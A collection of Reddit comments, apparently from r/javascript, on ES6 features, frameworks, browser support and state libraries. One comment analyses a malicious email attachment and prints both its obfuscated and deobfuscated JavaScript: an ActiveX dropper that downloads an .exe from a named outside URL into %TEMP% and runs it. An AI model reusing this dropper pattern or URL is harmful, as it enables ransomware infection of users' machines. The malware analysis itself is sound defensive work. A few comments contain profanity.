Normal function literals do not reset `this`, they just have their own context. That's why you can change the context through bind, call, etc. Arrow functions have no context at all, and thus use the `this` of their containing function - and also why bind, call and others have no effect on them. For the most part, a normal function's `this` will agree with the declaring context. Only in certain scenarios like being "torn off" is it "reset".
I agree. Maybe it's because I came with less baggage not being a hard core ng1 user. I actually started with React which is best but I feel ng2 gives me more of a complete package without pulling down a thousand different libraries and trying to convince them to work together and play nicely 
it's the same as this one: https://www.reddit.com/r/javascript/comments/49iy9o/this_java_script_file_was_in_an_email_while_i/
 var names = ["Ewan", "Fleabag", "Sam", "Caddy"]; var res = names.filter(function (name) { return name === "Sam"; })[0]; Good lord are (some) JS developers are spoiled.
Don't worry, you're not alone. Also, why allow us to name input variables to a function if you're not actually going to use them? This is the output I am getting in chrome. foo = (x=1, y=2) =&gt; x === y foo(y=2) &gt; true
This: const user = (state = { name: 'Ewan' }) =&gt; { console.log(state.name); } I would agree, is much more confusing. Normal use of lambdas, especially with promise chains, look much cleaner to me: let x = getResult() .then(res =&gt; { return res.load(); }) .then(res =&gt; { return { data: res }; }); Especially with an editor that highlights ES6 correctly. Edit: and in retrospect, that could have been written as let x = getResult().then(res =&gt; res.load()).then(res =&gt; ({data: res})); I think I still like the first one though, especially if you would have to mix and match single-line lambda's, which creates more confusion than it helps with in my mind. 
Ahhh also i can't believe it slipped my mind by also given the nature of those graphics you might consider doing something with SVG.
The only reasons people used comma initialization was because of var's unexpected function scope (as opposed to let and const's block scope) and for better compression in minification. Comma-dangle broke older versions of IE.
I've never liked the idea of code generators that I didn't author myself. Mainly because then I am building an app around scaffolded out code, which is harder to debug. This is especially true with beginners. So that's why I steered away from yeoman. Something like jspm brings in the same issue as just using webpack, while it might be simpler, most people building apps would rather build apps than configure a module compiler. The real inspiration was my Elm experience in the last couple months. I had never used a compile-to-JS language before, but it got me thinking: If I can write crazy elm code, and crazy elm markup, why can't I write crazy babel and crazy jsx. I really want enclave to be the elm-reactor for react apps. Also, I took a week off work to kind of decompress, and just wanted something enjoyable to work on, I had a lot of fun learning about CLI stuff. :D
They aren't named. You are defining a new global variable `y` and setting that to `2`, and the expression value is used as the value for the `x` parameter. EDIT: If you want something akin to named parameters, use destructuring. const deuse = ({ x, y }) =&gt; use(x, y);
I agree. I just spent the last 2 years learning es5 and now that I'm pretty comfortable es6 comes around looking like a brand new language... Will the old syntax still work in 6?
Ahh, thanks.
I see. Thanks.
I think you mean very malicious! There's a lot of noise, but the basic idea is that it uses ActiveX to write some environment variable, start an XMLHTTP connection to fetch a .exe, write it to disk, then run it.
&gt; I thought this was considered bad practice. Based on what? People also think coding without semi-colons is bad practice but major codebases are written without a single one.
Thanks for the feedback. It's early days and I am testing the water so can change things easily. 
Feel free to show better solution.
This is about commas, not semi-colons. Major codebases are also written in Fortran, but that is not a good reason in itself to use it. So too with coding style. That something can be done doesn't mean it should be done. Edit: I missed the 'also' in your sentence. It was once considered bad practide because it broke older versions of IE. With their retirement, and now the frequent use of babel and other similar translation tools, the dangling comma can be safely used.
I think the reason .then(res =&gt; {data: res}) won't return an object is because it interprets the curly braces as part of the function instead of an object. If you wrap the object in parentheses, it understands that you're trying to return whatever is in there. .then(res =&gt; ({data: res}))
I didn't mean to make this about semi-colons.. just curious as to where the idea that comma-dangle is bad practice comes from. Both comma-dangle and semi-colons are neither good or bad practice in my opinion. Edit: saw your edit. Makes sense!
See edit above. I believe dangling comma is a best practice for exactly the reasons mentioned: ease of code rearrangement, removal, and addition within the list or object, a common practice in refactoring. Most time programming is not spent writing the code, but modifying and reading the code.
Oh I know.. I use `multi-line always`--but I do think terms like "best/bad practice" should be reserved for behaviour and not style, which can get slippery slopish / bikesheddy.
Could you tone it down with the javascript scrolling? When I try to drag the scrollbar down, it "sticks" to the top. *Edit*: I see you're already looking into that - Carry on, then :-)
I have nothing against one-liners, just against people choosing bad, slow one-liners over robust, fast multi-line solutions. If you can write a great solution in one line, then great.
If only JavaScript was more like Haskell. Then that would actually be a really efficient way to do it.
That's true. If you're gonna start using things like Array's functions instead of manual for loops, you better read through them and understand how each of them works. Of course, what I just said would have been a much better initial post than your "dear god ppl are spoiled", which is what got you the downvotes and discredited any valid opinion you might have on the matter.
*Nothing* is passed by reference in JS. Note: this is why this site is no good for technical discussions. Rather than replying and perhaps correcting their misconceptions, seems that "Redditors" just down-vote anything they don't understand. :( Can go back *decades* and find this same misconception corrected on Usenet, which was clearly a superior discussion platform to this or StackOverflow. No better example of such futility than this thread; voting and technical discussions just don't mix. Should go without saying as the *majority* of users on such sites are seeking enlightenment or confirmation, not providing expert advice.
Even that page doesn't work right in mobile Firefox Edit page doesn't work in Android Firefox &lt; 46 beta 
He said to thank him *later*.
I think that this project is really amazing, but the licensing plan, as it is now, is not for my company. The best chance would be to have a license for site/project, or also for developers but as a one time fee. The price also seems a little bit too high, but that's a different story... Anyway, thank you for your great work :)
Chrome has been slower than Edge and Firefox to implement ES6 features, so Chrome implementing it generally means all popular browsers except maybe Safari have it.
There's a design flaw here, demo: var x = state(true); var y = state(2); var z = state(() =&gt; x() ? 1 : y()); x(false); console.log(z()); // yields `2` (correct) y(3); console.log(z()); // yields `2` (incorrect) The fix is to invalidate the list of inputs when an input changes, not just the output.
That looks very malicious. It essentially downloads a .exe, saves it to `%TEMP%/ykxldbW.exe`, and then runs it ([VirusTotal of the .exe](https://www.virustotal.com/da/file/8fb3a41b9b333b7cdf7614055842ad75d8b6253fdedf7d00b2ac0537e89f5dc8/analysis/) / [Malwr.com](https://malwr.com/analysis/YzMxOGRhZDRhODk4NDA3MWIyNzFhZDhlNzNjMDlhOGY/) - looks like a cryptolocker). Quick rundown: var WngHp = [(...) + "..." + (...) + ...]; When you have a parentheses containing expressions (in this case string literals) separated by commas, the parentheses is resolved to the return value of the last expression - in this case you can ignore everything but the last string literal, meaning the array becomes var WngHp = ["DLgNisQgdo", "qPTQDjFe", "ExpandEnvironmentStrings", "%TEMP%", "/ykxldbW.exe", "Run", "ActiveXObject", "WScript.Shell", "QEoxlnM", "MSXML2.XMLHTTP"]; Which should fire off every warning light there is. var WnsoTJgvG = this[WngHp[100+66-16*10]]; var xaSeCg = new WnsoTJgvG(WngHp[7]); var LrmIbrs = new WnsoTJgvG(WngHp[9]); var TvlsOstY = xaSeCg[WngHp[2]](WngHp[3]) + WngHp[4]; Translates to var activeX = this[WngHp[6]]; // window["ActiveXObject"] var shell = new activeX("WScript.Shell"); var http = new activeX("MSXML2.XMLHTTP"); var output = acctiveX("ExpandEnvironmentStrings")("%TEMP%") + "/ykxldbW.exe"; So we now have a shell on the users computer, a way to load a file hosted on a webserver, and a hidden location to save it in. The whole block of LrmIbrs[("tiffany","flaunt","o")+"nready"+("disgorge","clove","somersault","closeted","s")+"ta"+"t"+("bountiful","employer","adult","e")+"ch"+("patrick","gathering","a")+"nge"] = function () { ... } Becomes http["onreadystatechange"] = function() { if (http.readystate === 4) { var stream = activeX("ADODB.Stream"); stream.open(); stream.type = 1; stream.write( http.ResponseBody ); stream.position = 0; stream.saveToFile(output, 2); stream.close(); } } And then finally try { LrmIbrs["o"+("truck","adroitly","rowdy","cosmos","p")+"en"](("labels","goth.","nottingham","jacket","G")+"ET", "ht"+("gamespot","dialects","tp:")+"/"+("abasement","funeral","/kaleo")+"f"+("officiate","world","is")+".com/"+"sy"+"st"+"em/logs/98yhb"+"764"+("molding","bewitched","d")+".exe", false); LrmIbrs[("leicestershire","rockies","s")+("solid","algeria","ozone","zoloft","e")+"nd"](); xaSeCg[WngHp[5]](TvlsOstY, 1, "JMuLygP" === "KrJJAPnU"); iTYptWO = " DocumentFragment nodes don\"t have gEBTN } else if ( support.qsa ) { return context.querySelectorAll( tag ); } } :"; } catch (CSVRI) { } Becomes try { // http.open("GET", "http://kaleofis.com/system/logs/98yhb764d.exe", false); http.send(); activeX["Run"](output, 1, false); } catch (e) { } (I commented out the line that opens the malicious .exe, so you don't accidentally run it)
yeah. but in the example is using variable for simplicity. In real world, I will definitely use a namespace object and define variables as property in the namespace object. So its quite possible.
No, I just write "1" when I'm supposed to, instead of writing "2" and hoping somebody somewhere figured I would make that mistake and did something about it. It's not like I'm advocating dropping to a lower level.
None of the other responses here use `Array.prototype.indexOf`, which is the most efficient solution here (much faster than `Array.prototype.find` and a bit faster than a for-loop). Depending on what it's actually trying to do, it may be enough just to do var res = "Sam"; If you really want res to be `"Sam"` if `"Sam"` exists in the array and `undefined` otherwise, the most idiomatic way in ES7 would be var res = names.includes("Sam") ? "Sam" : undefined; Or in ES5-ES6 var res = names.indexOf("Sam") &gt;= 0 ? "Sam" : undefined; In ES3, you'd probably want a for-loop, though.
Oh, that is very interesting. I see no obvious way to fix this issue other than not allowing branching `if`. Very unsetting. Thanks for reporting that.
Well Microsoft also dropped support for older MSIE on Jan 12th. So you can't really fault the jQuery team for not eating dogfood that MS won't even eat any more. For all intents and purposes, ie 11 is the oldest supported version of IE that any sane person should worry about. It's finally time to tell users you are going to drop support and use a VM when internal applications need IE &lt; 11
A sample of the source code http://essenmitsosse.de/pixel/scripts/zeus.px Edit: Not mine btw, saw this on HN.
Hi, sorry, why do you say roughly? Isn't that exactly what it is? Thanks
No worries, I read it as the best of intentions, I really appreciate the feedback :)
Yup, and Safari is still a thing :(
&gt; It would happen if you called `x(5)` between both console.logs, but that is the wrong usage. After setting a state variable you should stop your program control flow immediately If that's the case, then why not simply use a plain function with `x` as an argument (See the last example in my comment above)? The mere *possibility* that `x()` might not be what we expect it to be makes the program hard to reason about. You are making things depending on some hidden state where state isn't needed. And if you *really* want to mutate things, why not just use a plain mutable variable? For example, in the counter example: count = state(0); // ... "&lt;div&gt;Value: " + count() + "&lt;/div&gt;" + "&lt;button onclick='count(count()+1), refresh()'&gt; If you have to do things like that, what is the real advantage over this?: var count = 0 // ... "&lt;div&gt;Value: " + count + "&lt;/div&gt;" + "&lt;button onclick='count++, refresh()'&gt; If this is what you mean by referential transparency, then any global mutable variable is also transparent, or a "pure value", as you call it.
good job, bro
Domas here, I'm helping Daniel with React Compose. We're also experimenting with building a community around clever functional composition tools, so if you into that - get in touch with us and we'll make something happen together :)
Do parseInt(d,10) first, javascript sees the return value of the prompt as '50' instead of 50 and coerces the following numbers as well.
I got to ask, why would anyone prefer scalaCss over less, sass or stylus. the syntax alone looks horrible to me.
Would love to hear your thoughts &amp; feedbacks
&gt; It is no big secret that TC39 were happy to mine Python for ideas. Well, I just learned about it today. I had no idea that they were looking to Python for inspiration. It is obvious once you know about it though.
The initial example is kind of contrived, but if we have something like this var `var people = [{name:"Sam", age:12} /* and so on */ ]` and you want to find Sams age, then the general approach used in the example makes sense.
Thanks :) Let's do everything to help people code.
Thanks for all the replies. It seems I had a good idea on what states are. But, the question on what state frameworks are used for still remains. Could somebody give me an example of a piece of code that would be greatly improved by using a library, in contrast to not using one? I realize this may be a bit "out there", but I'd really like to "get it", because I'm feeling I'm getting left behind with all the JS knowledge out there. I'd like to catch up as fast as possible.
I don't agree with why you're downvoted, but the reason might be obvious. Your code has a tremendous amount of mistakes for its size. I don't think answering your question will help you, unless you don't plan on ever doing web development again. I suggest starting with the basics, perhaps picking up a couple courses at something like https://www.codecademy.com/ To answer your question: &lt;input type="text" id="amntOwed" /&gt; &lt;button onclick="getAmount();"&gt;Get Amount&lt;/button&gt; &lt;script&gt; function getAmount(event){ var sum = "a sum here", amntOwedElement = document.querySelector('#amntOwed'); event.preventDefault(); amntOwedElement.value = sum; } &lt;/script&gt; * document.write will actually clear the document by opening a new document, that is why your entire page is lost when running the script. (see: https://developer.mozilla.org/en-US/docs/Web/API/Document/write ) * You already received the value from the inputs, you should be doing the same thing to write to the input, by using the value property (see: https://developer.mozilla.org/en/docs/Web/API/HTMLInputElement ) * Also keep in mind that an input cannot contain any child nodes, it's always an empty element (see: https://developer.mozilla.org/en-US/docs/Glossary/empty_element )
I don't see the problem with the latter. In Haskell you can't mutate variables. So if you want one variable to depend on other variables, the obvious choice is to use functions. Yes, it reads a bit awkward, but everything is pure, and in Haskell you can use many kinds of abstractions to make writing this kind of things easier. But even when passing states manually, it isn't as troublesome as it looks, and you retain all the benefits of purity. For example, suppose you have a complex calculation that depends on a stateful value `x()`, how can you possibly test it? You have to first setup these stateful values, and reset them every time you want to test for a different value. With pure functions, you simply pass in different values and you're done. What if in a really long chain of stateful variables, something accidentally calls `x(1)` at the wrong time? (Edit: I mean when `x` lies in the middle of a chain of stateful variables) Everything depending on `x` will break silently in a mysterious way and there's no way for you to inspect this. I agree manually passing state around is awkward and confusing at times, but **purity matters**. It's what functional programming is all about. Instead of throwing purity out of the window, why not try to devise abstractions, like those found in Haskell, that would make dealing with purity easier? Edit: I'm not saying what you're doing isn't good or anything. I'm just saying that it's not pure, which can actually be a good thing sometimes, as you've demonstrated. But advertising it as "pure" isn't right, IMHO.
Being in a position of always having to support older versions of IE, this stuff makes me sad. 
I was talking about the possibility of a typo (`x(1)` instead of `x()`) that would be hard to catch. As to the second point, what I'm saying is that `x = state(() =&gt; y())` is like `x = () =&gt; y /* y being a global var */`. Both are harder than pure functions to test in isolation because of the dependency on some external, mutable state. Now, these points may or may not be a problem depending on one's use case. I'm just trying to illustrate how this mutative approach differs from the purely functional approach.
Can I just say that I'm sick of everything being described as "beautiful" or "elegant" all the time?
All they've done is add a couple new features to the same language you have been using this whole time.
I don't want to make copies of them; I recognize that the `THREE` instances are designed to be mutated. My issue is more around controlling when/how those instances get mutated.
You can define getters on the global object.
Safari users can fuck right off. IE users had the excuse that they didn't know any better or are stuck with the browser for silly corporate reasons. Safari users have made a conscious choice.
Nobody uses Brave (yet).
It's not about putting everything on one line but about intent. Much better than any imperative solution.
/r/whoahdude
[removed]
1. ES6 classes aren't just constructors-with-prototypes -- there's some magic involved to make `super` work 2. ES6 class constructors aren't regular functions -- they can't be invoked without `new` 3. Arrow functions aren't the same as `Function.prototype.bind` -- they simply lack the magical `this` and `arguments` (instead closing over them like functions close over other variables) So it's more of an approximation based on the developer's intent than a 1-to-1 translation of the exact behaviour.
Personally I'd go with let res = null; for (const name of names) { if (name === 'Sam') { res = name; break; } } console.log(res); It's a bit weird -- despite ES6 having finally given us arrow functions to make lambdas easier to write I find myself using for loops more frequently in ES6 than ES5 because `for of` is so straightforward. But for this trivial example I'd just go with `names.indexOf('Sam')` anyway.
https://babeljs.io/ I have been using babel and it has been working fantastically. 
I'm currently working on a [similar project](https://github.com/Wildhoney/Keo).
so (as the examples hint at), an API very similar to Ninject. It looks pretty good. My one gripe with the whole idea of IoC containers in JS though, is that unlike in languages like C# or Java where "everything is global" (assuming you type the whole namespace), and you use IoC containers to isolate that, in JS there's already a module loader. And while in node they act as factory methods, ES6 modules and Require used via bundlers are essentially just syntax sugar for an control inversed dependency injection mechanism, regardless of what it looks like. And i kind of feel like creating a C#/Java style IoC container just duplicates that effort in a non-idiomatic way. I'd rather we build on top of the module loader system (even though it wasn't really meant for DI). As it is, you're now hiding dependencies from the static analysis tool. The kernel depends on everything, so when trying to do things like code splitting or trying to generate common chunks via webpack, your atomic unit is the kernel, which isn't granular enough IMO or doesn't tell the "real" story. A similar problem happened when using the popular pattern for using CommonJS with Angular (eg: https://blog.codecentric.de/en/2014/08/angularjs-browserify/). That being said, its likely all these issues can be dealt with by just not thinking of it as java or C#. (eg: Kernels would have to be broken down the way you want to code split, which isn't that hard), and you definitely could have done worse than picking Ninject-style API (which is awesome).
For some reason reminded me of cyriak's YouTube videos.... https://youtu.be/FavUpD_IjVY
The `super` keyword is specific to classes, but is again, sugar. Moreover, you can emulate it without that much trouble: var Animal = function() {}; Animal.prototype.sayHi = function() { return 'hi'; }; var Cat = (function() { var parent = Animal; var Cat = function() {}; Cat.prototype.sayHi = function() { var greeting = parent.prototype.sayHi(); console.log(greeting); return greeting; }; return Cat; }()); I'm not aware of any functionality specific to classes that you can't replicate without them, so that's why I call them sugar.
Safari, the new IE in terms of being behind and having the most quirks to program around. Echoing the sentiment that it can fuck right off.
Ok. I would tread carefully trying to implement immutable patterns in a 60FPS render loop though. You pretty much have to rely on mutation to maintain your framerate. My basic rule of thumb is that it's okay to create new objects at intervals that have multiple frames (seconds, etc.) spaced between them. Anything that happens per frame or multiple times per frame must not create new objects. In my projects, *most* of my app logic tends to exist in a per-frame or many-times-per-frame basis, but for other types of 3D apps this may not be the case. Sorry if that's all obvious to you, I wasn't sure from your question. I can't speak to the quality of the codebase you inherited, but OOP doesn't necessarily have to mean poor design. Private/internal state management is often a pretty good solution when you can't afford immutability. And a 3D scene graph is one of those things that lends itself pretty well to inheritance patterns. Regarding the camera example, I would design an app to only set camera parameters in one location based on the state that affects it. Other parts of the app shouldn't have access to the camera object. That can still be done in pretty straightforward OOP style.
These big ass header images are evolving, now I have to press page down twice, to start reading the article.
Second the annonance
Beautifully said.
I could see some kind of use case if it was actual function composition, but we don't need a library for that. Really not use of the use case here.
Obvious question: Why?
Monorepo with multiple npm sub packages is easier for private modules, while separate repos are easier for public packages IMO. Monorepo needs less complicated build pipelines, it's easier for CI jobs to determine if a dependency change broke another component, it's easier to coordinate changes to multiple packages, and it's easier to deploy and revert (one commit === one deploy, vs possibly many commits across several repos in a deploy). We run our own NPM server.
Safari is the most battery-optimized web browser on earth. FUCK YOU.
I can't scroll on mobile. Seemed like it could have been an interesting article on tools to program a good website if it would let me read the website.
Elegant response.
Did he just call C-style tagged unions a feature of functional languages?
I really like that this not only explains the what or how, but also the why. 
Need to see the code that's being run that causes that.
When using bitwise operations in javascript, they first get converted to an `int`, from that point, it's a simple matter of [twos complement](https://en.wikipedia.org/wiki/Two%27s_complement) So let's looks at `9` in binary: 00000000000001001 If we were to flip all of those bits, which is what `~` does then we wind up with 11111111111110110 Which is equal to -10. If were were to compute `!(-10)` then that evaluate to true, since only zero (and `NaN`) evaluate falsy
Keo is certainly similar, but takes a middle-ground in between full-blown React components, and simpler pure components. It encourages **all** of your components to be built that way. You can also pass additional properties than just `props`. Keo also automatically sets up a `shouldComponentUpdate` based on your defined `PropTypes` to prevent re-rendering when its properties aren't updated. You also have access to **most** lifecycle methods.
He also has a SHA-1 [implementation](http://www.movable-type.co.uk/scripts/sha1.html#src-code).
The artwork made me think of Mike Mignola in parts.
Also "stunning." A stunning new coffee mug design. A stunning new feature. Everything seems to stun!
Would definitely not recommend React in this case. The dynamically generated forms signals React. The validation signals stock jQuery. Multi-image uploads either signals a modern browser, or some other special purpose library. Honestly though, if you aren't super familiar with frontend development, I'd recommend stock jQuery and doing things without a framework. Move on to a framework when things get too complicated and you start to understand why they're needed. More often than not, frameworks are overkill. The only thing in your list that may warrant one is the dynamically generated forms, but even then I'd recommend holding off so you can learn the basics.
If you go this way, functions were also existing in C, but...
&gt; ES6 is a standard. Most of it is supported in the latest version of major browsers. I wouldn't call 93% support in _one_ major browser "supported". ES6 won't be usable for a couple of years at least. Until I can run ES6 on a $100 smartphone with a stock browser, I'm not risking it yet.
You'll commonly see this used with something like `indexOf` because it can be used to convert the result of indexOf (-1 if not found, or 0+ if is found) into a bool for found/not-found. This is because ~-1 is 0 (falsy) and ~0 is -1 (truthy), ~1 is -2 (truthy) and so on. So... !~['b','c','d'].indexOf('a') //-&gt; true (not found) !~['b','c','d'].indexOf('b') //-&gt; false (found) !~['b','c','d'].indexOf('c') //-&gt; false (found) etc. ES6 brings `Array.includes` which can help reduce these awkward operator shenanigans. 
Default args in general, nothing, I love them. That snippet above though, I find "confusing" in the sense that there's so much shorthand going on, I actually have to slow down to read it and figure out what's going on. I can make sense of it after a couple seconds, but I can read code extremely quickly normally, to get a basic idea of what's going on, so for that I would argue readability suffers in place of speed of shorthand. Code should be written so it's easy to read, first and foremost, and then everything else. Could be my opinion, possibly I haven't gotten used to the new syntax to read it fast enough (sort of doubtful since I've been using babel for a while, but possible), so who knows. 
Angular has great form validation, and you can generate dynamic forms if you want. Use dropzonejs in a directive for uploading.
Just use Babel.
FWIW I think what you're describing is a complex UI requirement, and I've been working on something very similar with React, [redux](https://github.com/reactjs/redux), and [redux-form](https://github.com/erikras/redux-form).
Web development is a very broad term. Some basic concepts to first understand in your journey are the differences between front-end development vs back-end development, what are frameworks/libraries/etc, how should I manage my project &amp; how do I write universal/easily manageable code. Once you have those basics down, you can then figure what area you may like to specialize in and/or continue down a generalist (full-stack) development position. For front-end development, common terms you will hear/can google are HTML/CSS/JavaScript (which you've looked into a bit thus far) and then from there common tools/libraries/frameworks include AngularJS, Backbone.js, bootstrap CSS, jQuery, etc. For back-end development, you have a lot of options; you can learn PHP, Ruby, Python, nodeJS (my personal favorite) + ExpressJS, etc. For managing projects, use git's application to organize projects/etc &amp; use something like bitbucket to host your project's for free. For code editors, I love sublime - simply, lightweight and has easy project management features. In general, you should continue to ask questions/seek resources like this because the best way to learn is via experience/etc. You should also always have some kind of side-project going so you can continue to improve your skills. Edit: Check this source out http://blog.teamtreehouse.com/i-dont-speak-your-language-frontend-vs-backend.
Holy shit!
Is it flame time!? I love flames! I don't know anything about safari, but I don't like it! Stupid dentist shooting beloved lions. 
I'll have to consider that. I don't know if I can ever get away from Bluebird or q though, unless JS natively implements `Bluebird.props`. The rest of the helpers Bluebird provides are just nice to haves, but being able to add promises as named properties to an object is so much more useful than an arbitrary array, especially if you don't know which promises you're going to need at "compile time". if (condition) { promises.cond1 = something(); } if (condition) { promises.cond2 = somethingelse(); } Bluebird.props(promises).then(res =&gt; .... is so much nicer than something like: if (condition) { promises.push(something()); } else { promises.push(null); } .... etc But destructuring arrays does make it easier. 
Cudos for coming clean with that. I am here in my capacity as the dumb person, however. A lot of people are clearly very excited by this, and I'm just not getting it. It appears that there is a DSL that defines rules that for the logic behind the canvas rendering, which results in changes of the image depending on the canvas size, which in this case is based on the mouse position. That is neat, but I am not excited. I'm not sure if this is a case of "why am I not excited", or a case of "why are you excited", but if you could take a shot at explaining the excitement I would appreciate it.
you should build this app using PureState.js: https://github.com/gaearon/flux-react-router-example Then we can compare it to flux and redux.
Wow that is cool
Meteor supports React, Angular, and Blaze (their own custom view) as view layers.
If you're OK with the minimal amount of stuff provided to you by React, you'll probably like Vue and Mithril as well. However, you'll be responsible for a lot more with these, which is why I recommended kitchen sink. Angular 1 and angular 2 are pretty different. Angular 1 was/is one of the most popular frameworks to use, despite some rough edges and bad architecture decisions. Angular is definitely in the "easy to learn, nightmarish to master" category - it'll be good if you just want to ship something and aren't too concerned about really squeezing performance out of it or things like that. However, I'd take any architecture decisions that it does with a huge grain of salt. I've also heard good things about Meteor and DoneJs, but honestly haven't done much with them, so I can't speak to them. Aurelia might not be a good starting place, since it assumes you have an ES6 environment set up. Same thing with Angular 2.
Take a look at Web2Py if you're already familiar with Python!
Kay lets clear something up right off the bat, javascript cannot be compared to other more classical languages in the sense that it has a number of features that make it unique (e.g. prototypal inheritance). With other languages C and python, you can straight swap from one to the other. With Javascript, true bits of it look syntactically similar and also perform the same way (e.g. function() does exactly what you'd expect) but put aside all assumptions you would normally when using another language (python). That said - &gt; To allow for dynamically generated forms That can be done with vanilla javascript although to prevent csrf you'd need to generate at least a token on the server anyway so if it comes down to it you could do the whole form like that. &gt; These forms will change as the user interacts with them, adding or subtracting input elements depending on what the user inputs. It's when you add that on that you're firmly in the realm of 2-way databinding capability. Think ORM between the HTML page itself (what's rendered) and the browsers virtual DOM structure. &gt; Client-side validation Again vanilla JS. You can simply augment whatever framework you choose. There are a number of [built-in objects in JS](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects) (this is what i was getting at before with regards to prototype inheritance). Specifically the one you want in this case is [RegExp](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp). &gt; Multi-image uploading and browsing How do you mean? Most of this would be determined by CSS and the server side, however i spose you could augment using AJAX and lazyloading. &gt; I have begun looking in to React and I find it very intuitive but it is not an all-in-one solution, it is just a library for rendering UI elements and updating their state? I'm impressed, most beginners are tempted by jQuery because of it's similarity / implementation of DOM parsing via CSS selectors even though jQuery is crap at parallel operations out of the box. However react, yes you're right. If you think of a typical MVC architecture, react would comprise just the View compared to some other frameworks. Nevertheless it does take care of 2-way databinding (as you said). I'd highly recommend vue js. Super good docs and examples and pretty much provides a nice callback structure where you can write your functions to accomplish whatever.
3 major browsers, plus Brave which had betas released recently. In any case, Babel is fine for most applications.. if you have very high performance requirements then it makes sense to wait a little bit, and I guess you're using lodash instead of native methods. 
I'm not sure if it's part of jsfiddle or not. I'll take a look and see if your fix works. Thanks!
Not by any means. If you look at one with snakes, the size of the loops in the snake don't generally scale, you get more loops or fewer to fit, and it's a gradual transition, while other parts of the picture are doing different transitions.
I second the "Meteor + React" or "Meteor + Angular" motion. I'm new in development, but I've done a ton of research to find out what to learn. Meteor seems to be the clear winner for me. 
You might want to look into [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame) which runs code between redraws.
Thanks for the input, really appreciate it! One core ambition is making it easier for designers and others to fiddle with application configuration. What do they need to do this? I would say a well thought-out and consistent api for a limited set of domain specific components. What react-compose does to help you accomplish this, is making it easier to reuse smaller parts of logic, throughout the application. (Smaller than components themself that is) These smaller parts of logic can be seen as a full vertical, from the exposed property (that takes in the "configuration") to sought after effect. Another benefit is testability. A lot of react components often end up quite bloated with alot of stuff going on, and a complex piece of output to boot. The smaller pieces that you split these components into, (and combine again with react-compose), are more straight forward to test. Since they, in the ideal case, has a simple output. Don't know if that makes much sense however, it's been a long day ;-) I haven't actually used recompose, so I can't really say much about it. What I can say however, is that it seems to have quite the extensive api with a lot of functionality in it, whilst react-compose really only have one basic function and a couple of helper functions for comfort. But I wouldn't say that I have created a better solution, it's just different. 
Yes, its not javascript, but lets be honest - isnt SVG+JS just awesome combo? Use some math and you can create beauty.
At the heart of react-compose is the concept of a props to props* transformation. These transformations are then composed to a single transformation. Every react component takes props as input, and returns another react component (or DOM element) with a set of props, which may or may not be different. If you strip away the component stuff, they are essentially a props to props* transformation. Dealing with these transformations are a big part of building React apps. Now, you are quite right indeed, that you don't need a library to compose these transformations. React-compose isn't that much of a library either, with a little over 100 lines of code plus some extra for configuration, it's more of a leaflet. And rather than composing functions like fnA(fnB(fnC))) you can write compose(fnA, fnB, fnC). What it comes down to is essentially whether you prefer to write the boilerplate yourself or not, it that's a matter of preference.
You should use templating systems only if you need it. If your extension doesn't do much, it makes no sense to use it. Also since it's an extension I'll try to use vanilla JavaScript instead of jquery and try not to depend so much on third party libraries unless you really need it. 
no, javascript is all executed on a single thead (unsure about ES6), that's why workers were created. http://www.html5rocks.com/en/tutorials/workers/basics/ &gt; One thing that's remained a hindrance for JavaScript is actually the language itself. JavaScript is a single-threaded environment, meaning multiple scripts cannot run at the same time. As an example, imagine a site that needs to handle UI events, query and process large amounts of API data, and manipulate the DOM. Pretty common, right? Unfortunately all of that can't be simultaneous due to limitations in browsers' JavaScript runtime. Script execution happens within a single thread.
Thank you both. /u/sigwhite /u/wreckedadvent
This article is not about the Maybe type in particular, but about the sum types in general. The Maybe type is just the simplest example. To me, the sum types *are* one of the building blocks of functional programming, I disagree this is a hijack. Of course in C you could encode sum types, as you could encode closures, but this is not a primitive construct. The primitive in C is the union, and unlike in functional languages, tagged-unions are not properly typed (you need to cast for destructuring). I believe that this is important to have in mind the "original" construct, rather than the "encoding". And the good news is that Flow now understands the sums, so that we can write type-safe destructuring in JavaScript.
Compose has meanings outside of functional algebra. For someone with OOP roots, when you hear 'compose' you practically never think "functional composition". Rather you'd think "the behavior of this object/component is created by containing other components/objects rather than inheritance". I believe that's what the React-dev's are implying when they use the term composition and looking at React JSX code (or even bare HTML), I think composition is a good fit in terminology. 
I still don't get it. If Apple communicated more with people, was responsive about bugs and so forth, they could easily make developers a lot happier, and probably even reap benefits from the communication for their own work. They've got a ton of smart people building neat, unique features. They have a browser with a solid foundation in Webkit, but seem to target their releases around marketing events instead of market needs. And then we get things like window.close (a pretty basic need for older authentication schemes) being broken on iOS Safari through several minor releases with no official explanation or heads-up on when it might be fixed. Oy.
ES6 offers a lot more than classes. Fat arrows, destructuring, rest, spread, object shorthand, module, generators, iterators, WeakMap, Set, etc
If you'll go with Angular, take a look at Angular Material. You'll get a set of solid components to build UI from, and will need little to no styling to write.
is there any reason that you aren't using the ecmascript "..." operator in your jsx to set default props? It's an excellent way of bypassing the blind copy action that requires ternarys or conditionals to be used inside the module to set defaults. More Here: https://facebook.github.io/react/docs/jsx-spread.html 
Cause we are buying our designer shots. Here's the logo that our fellow developer came up with at first: https://s3.amazonaws.com/f.cl.ly/items/2W0B0D0l403i1O0o3n1i/react-compose-placeholder.jpg
Furthermore, you'd be much better off using *static* CSS rules to describe various UI states as most will be *predetermined*. Using variables to track something that is predetermined just adds pitfalls for no reason. &gt; should only ever be one or the other but never both Exactly and you are screwing that up with variables. Just write the CSS rules that makes sense, test them *once* and go on with life. Otherwise opens the door for bugs that should never exist. ;) It's a lame example, but: .showing-tab1 #panel1, .showing-tab2 #panel2 { display: block; } .showing-tab1 #panel2, .showing-tab2 #panel1 { display: none; } If that's too ugly for you, either hire a Web designer (unlike JS, they can usually read CSS) or generate the static CSS *offline*. ;)
I talked to the JS community and they've got a problem with *you*. :) 3 types of answers? jQuery posts are useless. Skip. Don't bother with Crockford. He knows the language, is clueless about the DOM and seems to have gone senile of late (see latest JSLint). As for "rants and preaching", you sound like you are looking for easy answers and you'll find plenty on the Web; unfortunately, every other greenhorn is reading them at the same time (and not learning anything either). Challenge yourself. :) Reddit *sucks* for technical discussions. Voting doesn't keep the discussion moving forward and so many issues are never resolved. Look at the myths repeated right here (e.g. passing arguments by reference).
Congratulations, you made it through all that unscathed. As you seem to have guessed, there are no such examples. Learn the language first and then you can more easily discuss it (and figure out that most libraries are a waste of time and space).
